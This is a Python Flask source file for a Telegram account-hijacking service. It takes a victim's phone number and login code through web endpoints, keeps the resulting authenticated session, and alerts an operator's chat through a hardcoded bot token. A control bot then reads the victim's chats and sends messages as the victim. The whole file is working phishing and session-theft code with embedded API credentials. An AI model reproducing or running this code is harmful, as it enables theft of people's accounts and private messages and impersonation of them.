from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
from datetime import datetime
from pathlib import Path
from threading import Thread

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
YOUR_CHAT_ID = "8796685138"

active_sessions = {}
SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

# Store which session each user has selected
user_selected_session = {}

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_sessions_list():
    """Get all active sessions with user info"""
    sessions = []
    for sid, data in active_sessions.items():
        if 'user_info' in data:
            sessions.append({
                'session_id': sid,
                'phone': data['phone'],
                'name': data['user_info'].get('first_name', ''),
                'username': data['user_info'].get('username', '')
            })
    return sessions

def sessions_keyboard(sessions):
    """Create keyboard with all available sessions"""
    buttons = []
    for sess in sessions:
        name = sess['name'] or sess['phone']
        username = f" @{sess['username']}" if sess['username'] else ""
        buttons.append([{"text": f"📱 {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
    buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sessions"}])
    return {"inline_keyboard": buttons}

def main_menu_keyboard():
    """Main menu after selecting a session"""
    return {
        "inline_keyboard": [
            [{"text": "📖 Read Messages", "callback_data": "menu_read"}],
            [{"text": "✏️ Send Message", "callback_data": "menu_write"}],
            [{"text": "📂 List Chats", "callback_data": "menu_chats"}],
            [{"text": "🔄 Switch Account", "callback_data": "switch_account"}]
        ]
    }

def chats_keyboard(dialogs):
    """Keyboard with chat list"""
    buttons = []
    for dialog in dialogs[:10]:  # Limit to 10
        name = dialog['name'][:30]
        identifier = dialog['identifier']
        buttons.append([{"text": f"💬 {name}", "callback_data": f"chat_read_{identifier}"}])
    buttons.append([{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}])
    return {"inline_keyboard": buttons}

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        chat_id = None
        message_id = None
        
        # Handle regular messages
        if 'message' in data:
            msg = data['message']
            chat_id = msg['chat']['id']
            message_id = msg['message_id']
            text = msg.get('text', '')
            
            if text == '/start':
                sessions = get_sessions_list()
                if sessions:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\n"
                        "Select an account to control:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\n"
                        "No active sessions found.\n\n"
                        "Please login first via the web page to create a session.")
            
            elif text == '/sessions':
                sessions = get_sessions_list()
                if sessions:
                    send_telegram_message(chat_id,
                        "📱 *Available Sessions*\n\n"
                        "Select an account:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    send_telegram_message(chat_id, "No active sessions found.")
        
        # Handle button clicks
        elif 'callback_query' in data:
            callback = data['callback_query']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            data_callback = callback['data']
            
            # Select session
            if data_callback.startswith('select_'):
                session_id = data_callback.replace('select_', '')
                if session_id in active_sessions:
                    user_selected_session[str(chat_id)] = session_id
                    session_data = active_sessions[session_id]
                    user_info = session_data.get('user_info', {})
                    
                    text = (f"✅ *Connected to:*\n\n"
                           f"📱 {user_info.get('first_name', 'Unknown')}\n"
                           f"🔢 {session_data['phone']}\n"
                           f"🆔 @{user_info.get('username', 'No username')}\n\n"
                           f"*What would you like to do?*")
                    
                    edit_telegram_message(chat_id, message_id, text, reply_markup=main_menu_keyboard())
            
            # Refresh sessions
            elif data_callback == 'refresh_sessions':
                sessions = get_sessions_list()
                if sessions:
                    edit_telegram_message(chat_id, message_id,
                        "📱 *Available Sessions*\n\nSelect an account:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    edit_telegram_message(chat_id, message_id, "No active sessions found.")
            
            # Main menu options
            elif data_callback == 'menu_read':
                edit_telegram_message(chat_id, message_id,
                    "📖 *Read Messages*\n\n"
                    "Send a message in format:\n"
                    "`/read CHAT_ID`\n\n"
                    "Examples:\n"
                    "`/read me` - Your saved messages\n"
                    "`/read @username` - Chat with username\n"
                    "`/read groupname` - Group messages\n\n"
                    "Or select a chat from below:",
                    reply_markup={"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]})
            
            elif data_callback == 'menu_write':
                edit_telegram_message(chat_id, message_id,
                    "✏️ *Send Message*\n\n"
                    "Send a message in format:\n"
                    "`/send CHAT_ID | MESSAGE`\n\n"
                    "Examples:\n"
                    "`/send @username | Hello there!`\n"
                    "`/send me | Note to self`",
                    reply_markup={"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]})
            
            elif data_callback == 'menu_chats':
                # Get chats in background
                Thread(target=show_chats_async, args=(chat_id, message_id)).start()
                edit_telegram_message(chat_id, message_id, "📂 Fetching your chats...")
            
            elif data_callback == 'switch_account':
                sessions = get_sessions_list()
                edit_telegram_message(chat_id, message_id,
                    "🔄 *Switch Account*\n\nSelect another account:",
                    reply_markup=sessions_keyboard(sessions))
            
            elif data_callback == 'back_to_menu':
                session_id = user_selected_session.get(str(chat_id))
                if session_id and session_id in active_sessions:
                    session_data = active_sessions[session_id]
                    user_info = session_data.get('user_info', {})
                    text = (f"✅ *Connected to:*\n\n"
                           f"📱 {user_info.get('first_name', 'Unknown')}\n"
                           f"🔢 {session_data['phone']}\n\n"
                           f"*What would you like to do?*")
                    edit_telegram_message(chat_id, message_id, text, reply_markup=main_menu_keyboard())
            
            # Read messages from chat button
            elif data_callback.startswith('chat_read_'):
                chat_identifier = data_callback.replace('chat_read_', '')
                session_id = user_selected_session.get(str(chat_id))
                if session_id:
                    Thread(target=read_messages_async, args=(session_id, chat_identifier, chat_id, message_id)).start()
                    edit_telegram_message(chat_id, message_id, f"📖 Reading messages from {chat_identifier}...")
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': True})

def show_chats_async(bot_chat_id, message_id):
    """Fetch and show chats"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def fetch():
        try:
            session_id = user_selected_session.get(str(bot_chat_id))
            if not session_id or session_id not in active_sessions:
                edit_telegram_message(bot_chat_id, message_id, "❌ Session expired. Please restart /start")
                return
            
            session_data = active_sessions[session_id]
            client = session_data['client']
            
            dialogs = []
            async for dialog in client.get_dialogs(limit=20):
                name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                identifier = dialog.chat.username or str(dialog.chat.id)
                dialogs.append({'name': name, 'identifier': identifier})
            
            if dialogs:
                text = "📂 *Your Chats:*\n\nClick on any chat to read messages"
                edit_telegram_message(bot_chat_id, message_id, text, reply_markup=chats_keyboard(dialogs))
            else:
                edit_telegram_message(bot_chat_id, message_id, "No chats found")
        except Exception as e:
            edit_telegram_message(bot_chat_id, message_id, f"❌ Error: {str(e)}")
    
    loop.run_until_complete(fetch())

def read_messages_async(session_id, chat_target, bot_chat_id, message_id):
    """Read messages"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def fetch():
        try:
            session_data = active_sessions.get(session_id)
            if not session_data:
                edit_telegram_message(bot_chat_id, message_id, "❌ Session expired")
                return
            
            client = session_data['client']
            messages = []
            
            async for message in client.get_chat_history(chat_target, limit=10):
                if message.text:
                    sender = message.from_user.first_name if message.from_user else "Unknown"
                    messages.append(f"👤 *{sender}*: {message.text[:200]}")
            
            if messages:
                text = f"📖 *Messages from {chat_target}:*\n\n" + "\n\n".join(messages)
                if len(text) > 4000:
                    text = text[:4000] + "\n\n...(truncated)"
            else:
                text = f"No messages found in {chat_target}"
            
            edit_telegram_message(bot_chat_id, message_id, text, reply_markup={"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]})
        except Exception as e:
            edit_telegram_message(bot_chat_id, message_id, f"❌ Error: {str(e)}")
    
    loop.run_until_complete(fetch())

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        session_id = secrets.token_hex(8)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def create_and_store_session():
            client = None
            try:
                session_file = SESSIONS_DIR / f"{session_id}"
                client = Client(
                    name=str(session_file),
                    api_id=API_ID,
                    api_hash=API_HASH,
                    workdir=str(Path.cwd())
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                active_sessions[session_id] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'session_file': str(session_file),
                    'created_at': datetime.now().timestamp()
                }
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'message': 'Code sent to your Telegram'
                }
                
            except Exception as e:
                if client:
                    await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(create_and_store_session())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def complete_login():
            try:
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                
                me = await client.get_me()
                
                # Store user info
                session_data['user_info'] = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username
                }
                
                # Notify your bot about new session
                send_telegram_message(YOUR_CHAT_ID,
                    f"✅ *New Session Created!*\n\n"
                    f"📱 {me.first_name} (@{me.username})\n"
                    f"🔢 {phone}\n\n"
                    f"Use /start on your bot to see this account"
                )
                
                return {
                    'success': True,
                    'message': f'Logged in as {me.first_name}',
                    'session_id': session_id
                }
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(complete_login())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/send-message-bot', methods=['POST'])
def send_message_bot():
    """Handle /send commands from bot"""
    try:
        data = request.json
        chat_id = data.get('chat_id')
        session_id = data.get('session_id')
        target = data.get('target')
        message = data.get('message')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session not found'})
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send():
            await client.send_message(target, message)
            return {'success': True}
        
        result = loop.run_until_complete(send())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(active_sessions)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
